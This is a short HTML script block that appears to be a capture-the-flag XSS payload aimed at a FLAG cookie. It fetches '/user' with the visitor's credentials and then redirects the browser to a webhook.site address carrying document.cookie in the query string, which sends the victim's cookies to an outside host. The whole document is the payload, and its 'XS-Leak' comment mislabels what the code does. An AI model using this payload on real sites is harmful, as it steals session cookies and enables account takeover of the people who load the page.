<script>
// XS-Leak payload to extract FLAG cookie
fetch('/user', {credentials: 'include'})
  .then(r => r.text())
  .then(data => {
    // Extract flag or send cookies to attacker server
    window.location = 'https://webhook.site/5e2efd7a-d4ef-417c-860f-bbfc5551b28b/exfil?data=' + 
                     encodeURIComponent(document.cookie);
  });
</script>
